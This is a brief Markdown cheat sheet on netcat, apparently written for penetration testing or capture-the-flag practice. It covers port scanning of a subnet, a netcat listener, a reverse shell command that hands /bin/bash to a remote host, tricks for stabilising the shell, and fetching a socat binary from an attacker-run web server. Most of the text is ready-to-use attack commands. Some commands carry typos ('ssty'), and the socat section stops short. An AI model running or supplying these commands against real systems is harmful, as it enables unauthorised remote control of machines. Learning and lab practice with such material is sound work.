# What is Netcat?
Read and write to network connections using TCP or UDP

# Port Scanning
A basic scan using netcat

| Option | Description |
| ------ | ----------- |
| `-nv` | Don't resolve DNS, verbose |
| `-w 1` | sets timeout to 1 second |
| `-z` | specifies a port scan |
| `-u` | UDP mode |

`nc -nv -w 1 -z 192.168.1.1/24` 

Scan a range of ports and store the result in a file
```sh
nc -nv -w 1 -z 10.10.10.10 1-65535 2>&1 | awk '/succeeded!$/{print $3}' > port-scan.txt 2>&1
```

## Reverse Shells

A listener on port 4200:
`-l` - Listener
`-v` - verbose
`-n` - No DNS
`-p` - Port

```sh
nc -lvnp 4200
```

Bash reverse shell
```sh
nc 10.10.10.10 4200 -e /bin/bash
```

### Stabalizing a linux shell

### Host Changes
You will want to make the following changes on your host to ensure the features are passed on your reverse shell.

Turn off terminal echo, allow tab complete, arrow keys and `CTRL+C`
```sh
stty raw -echo; fg
```
Get your terminal settings with `-a` and set them manually for the reverse shell.
```sh
ssty -a
ssty rows <number>
stty cols <number>
```

#### 1. Using Python
```sh
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

#### 2. RLWrap
Is a program that gives access to history, tab completion, and the arrow keys. The technicque of prepending `rlwrap` to netcat is useful when interacting with windows.

```sh
sudo apt install rlwrap
rlwrap nc -lvnp 4200
```

#### 3. SOCAT
- Limited to linux
- Requires [static binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true)
  
Serve the binary from a temporary webserver:
```sh
python3 -m http.server 8080
wget 10.10.10.10/socat -O /tmp/socat
Invoke-WebRequest -uri 10.10.10.10/socat.exe -outfile C:\\Windows\temp\socat.exe
```
